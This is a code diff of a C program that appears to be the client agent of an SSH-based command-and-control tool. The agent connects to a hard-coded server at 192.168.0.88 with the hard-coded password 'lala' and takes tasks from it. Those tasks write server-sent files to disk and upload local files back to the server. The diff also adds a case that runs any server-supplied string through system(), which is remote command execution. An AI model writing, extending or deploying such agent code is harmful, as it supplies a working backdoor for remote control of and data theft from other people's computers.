@@ -4,6 +4,21 @@ struct tasking_struct* firstStruct = NULL;
 struct tasking_struct* lastStruct = NULL;
 char folderpath[256] = "C:\\Users\\";
 FILE* logfile;
+ssh_session session = NULL;
+
+int catchChannelError(int check, ssh_channel chan) {
+	if (check < 0) {
+		fprintf(logfile, "CHANNEL ERROR ABORTING!!!\n");
+		ssh_channel_close(chan);
+		ssh_channel_free(chan);
+		ssh_disconnect(session);
+		ssh_free(session);
+		ssh_finalize();
+		fclose(logfile);
+		exit(-1);
+	}
+	return check;
+}
 
 int parse_tasking(char* tasking, ssh_channel chan) {
 	/* Parses and handles the tasking input from the server*/
@@ -11,7 +26,7 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 	// checks if there is no tasking
 	if (!strncmp(tasking, "default", 7)) {
 		fprintf(logfile, "No tasks to do. Quitting...\n");
-		ssh_channel_write(chan, "0", 2);
+		catchChannelError(ssh_channel_write(chan, "0", 2), chan);
 		return 0;
 	}
 
@@ -72,17 +87,17 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 			strcpy(send, temp2);
 			strcat(send, "|");
 			strcat(send, firstStruct->opts);
-			ssh_channel_write(chan, send, strlen(send)+1);
-			ssh_channel_read(chan, size, sizeof(size), 0);
-			ssh_channel_write(chan, "ok", 3);
+			catchChannelError(ssh_channel_write(chan, send, strlen(send)+1), chan);
+			catchChannelError(ssh_channel_read(chan, size, sizeof(size), 0), chan);
+			catchChannelError(ssh_channel_write(chan, "ok", 3), chan);
 			
 			size_t memsize = atoi(size) + 1;
 
 			contents = malloc(sizeof(*contents) * memsize);
 
-			ssh_channel_read(chan, contents, memsize, 0);
+			catchChannelError(ssh_channel_read(chan, contents, memsize, 0), chan);
 			contents[atoi(size)] = '\0';
-			ssh_channel_write(chan, "ok", 3);
+			catchChannelError(ssh_channel_write(chan, "ok", 3), chan);
 
 			char *filecontent = malloc(sizeof(*filecontent) * b64_decoded_size(contents));
 			b64_decode(contents, filecontent, b64_decoded_size(contents));
@@ -95,7 +110,6 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 			strcat(filename, "\\");
 			strcat(filename, firstStruct->opts);
 			file = fopen(filename, "w");
-
 			if (file == NULL)
 			{
 				fprintf(logfile, "Unable to create file.\n");
@@ -131,18 +145,21 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 			strcat(sendcommand, ufilename);
 			rewind(toupload);
 
-			ssh_channel_write(chan, sendcommand, strlen(sendcommand));
-			ssh_channel_read(chan, temp, 3, 0);
+			catchChannelError(ssh_channel_write(chan, sendcommand, strlen(sendcommand)), chan);
+			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
 			char sizebuf[64] = "ok";
 			sprintf(temp, "%d", uploadsizee);
-			ssh_channel_write(chan, temp, sizeof(temp));
-			ssh_channel_read(chan, temp, 3, 0);
+			catchChannelError(ssh_channel_write(chan, temp, sizeof(temp)), chan);
+			catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan);
 
 			fread(filedata, 1, uploadsize, toupload);
 			char* encodedfiledata = b64_encode((unsigned char*)filedata, uploadsize);
-			ssh_channel_write(chan, encodedfiledata, uploadsizee);
-			ssh_channel_read(chan, temp, 8, 0);
+			catchChannelError(ssh_channel_write(chan, encodedfiledata, uploadsizee), chan);
+			catchChannelError(ssh_channel_read(chan, temp, 8, 0), chan);
 
+			break;
+		case AGENT_EXEC_SC:
+			system(firstStruct->opts);
 			break;
 		default:
 			fprintf(logfile, "ERROR: Caught unknown tasking value: %d\n", firstStruct->operation);
@@ -155,13 +172,11 @@ int parse_tasking(char* tasking, ssh_channel chan) {
 	return 0;
 }
 
-
 int func_loop(ssh_session session)	//probably replace
 {
 	/* Primary function loop */
 	// Initialize vars
 	ssh_channel channel;
-	int rc;
 	char tasking[2048];
 	int nbytes;
 
@@ -169,75 +184,48 @@ int func_loop(ssh_session session)	//probably replace
 	channel = ssh_channel_new(session);
 
 	fprintf(logfile, "[+] Created new SSH channel\n");
-	if (channel == NULL)
-		return SSH_ERROR;
+	if (channel == NULL) return SSH_ERROR;
 
 	// Open channel
-	rc = ssh_channel_open_session(channel);
+	
+	if (ssh_channel_open_session(channel) != SSH_OK)
+	{
+		ssh_channel_free(channel);
+		return -1;
+	}
 	fprintf(logfile, "[+] Opened SSH Channel with remote server\n");
-	if (rc != SSH_OK)
-	{
-		ssh_channel_free(channel);
-		return rc;
-	}
-
 	// Request a shell interface
-	rc = ssh_channel_request_shell(channel);
 
-	fprintf(logfile, "[ ] Sent request for shell\n");
-	if (rc != SSH_OK)
-	{
-		ssh_channel_close(channel);
-		ssh_channel_free(channel);
-		return rc;
-	}
+	catchChannelError(ssh_channel_request_shell(channel), channel);
 	fprintf(logfile, "[+] Made it through check\n");
-
-	// Begin the meat of the stuff
-
-
+	
 	// Send the global ID
 
 	fprintf(logfile, "Identified as an agent\n");
-	rc = ssh_channel_write(channel, "1", 2);
+	catchChannelError(ssh_channel_write(channel, "1", 2), channel);
 
 	//write that I am an agent
 	char temp3[3];
-	ssh_channel_read(channel, temp3, 3, 0);
-	ssh_channel_write(channel, "NA\nNA\nNA\nNA\nNA", 15);
+	catchChannelError(ssh_channel_read(channel, temp3, 3, 0), channel);
+	catchChannelError(ssh_channel_write(channel, "NA\nNA\nNA\nNA\nNA", 15), channel);
 
-	fprintf(logfile, "Waiting for read...\n");
-	nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
-	fprintf(logfile, "read %d bytes from channel\n", nbytes);
-	if (nbytes < 0) {
-		fprintf(logfile, "Caught read error from server...\n");
-		ssh_channel_close(channel);
-		ssh_channel_free(channel);
-		return SSH_ERROR;
-	}
+	catchChannelError(ssh_channel_read(channel, tasking, sizeof(tasking), 0), channel);
 
 	fprintf(logfile, "Read data: %s\n", tasking);
 	parse_tasking(tasking, channel);
 
 	// close connections
-	rc = ssh_channel_write(channel, "0", 2);
-	if (rc == SSH_ERROR) {
-		fprintf(logfile, "Caught ssh error: %s\n", ssh_get_error(channel));
-		ssh_channel_close(channel);
-		ssh_channel_free(channel);
-		return SSH_ERROR;
-	}
+	catchChannelError(ssh_channel_write(channel, "0", 2), channel);
 
-	rc = ssh_channel_close(channel);
-	if (rc == SSH_ERROR) {
-		fprintf(logfile, "Caught ssh error: %s\n", ssh_get_error(channel));
-		ssh_channel_free(channel);
-		return rc;
-	}
-
+	int close = ssh_channel_close(channel);
 	ssh_channel_free(channel);
 
-	return SSH_OK;
+	return close;
+}
+
+int catchError(int check, const char* message) {
+	if (check != 0) fprintf(logfile, "%s Error: %i\n", message, check);
+	return check;
 }
 
 ssh_session connectserver(const char* host, const char* user) {
@@ -251,40 +239,12 @@ ssh_session connectserver(const char* host, const char* user) {
 		return NULL;
 	}
 
-	// check and set username
-	int loginuser = ssh_options_set(session, SSH_OPTIONS_USER, user);
-	if (loginuser < 0) {
-		fprintf(logfile, "Setting Username Error: %i\n", loginuser);
-		return NULL;
-	}
+	if (catchError(ssh_options_set(session, SSH_OPTIONS_USER, user), "Setting Username") != 0) return NULL;
+	if (catchError(ssh_options_set(session, SSH_OPTIONS_HOST, host), "Setting Host") != 0) return NULL;
+	if (catchError(ssh_connect(session), "Connection") != 0) return NULL;
+	if (catchError(ssh_userauth_password(session, NULL, "lala"), "Authentication") != 0) return NULL;
 
-	// set target host
-	int loginhost = ssh_options_set(session, SSH_OPTIONS_HOST, host);
-	if (loginhost < 0) {
-		fprintf(logfile, "Setting Host Error: %i\n", loginhost);
-		return NULL;
-	}
-
-	// make the connection
-	if (ssh_connect(session)) {
-		fprintf(logfile, "Connection failed : %s\n", ssh_get_error(session));
-		return NULL;
-	}
-
-	// Try to authenticate
-	int auth = ssh_userauth_none(session, NULL);
-	if (auth == SSH_AUTH_ERROR) {
-		fprintf(logfile, "Authentication failed: %s\n", ssh_get_error(session));;
-		return NULL;
-	}
-
-	//send password
-	int password = ssh_userauth_password(session, NULL, "lala");	//change the password'lala' at some point
-	if (password != SSH_AUTH_SUCCESS) {
-		fprintf(logfile, "Authentication failed: %i\n", password);
-		return NULL;
-	}
-	if (password == SSH_AUTH_SUCCESS) return session;
+	return session;
 }
 
 int main()
@@ -309,7 +269,7 @@ int main()
 	
 	fprintf(logfile, "==============================\n\n");
 
-	ssh_session session = NULL;
+	
 	session = connectserver("192.168.0.88", "WINDOWS_CLIENT");	//Make this less hard-coded
 
 	if (session == NULL) {
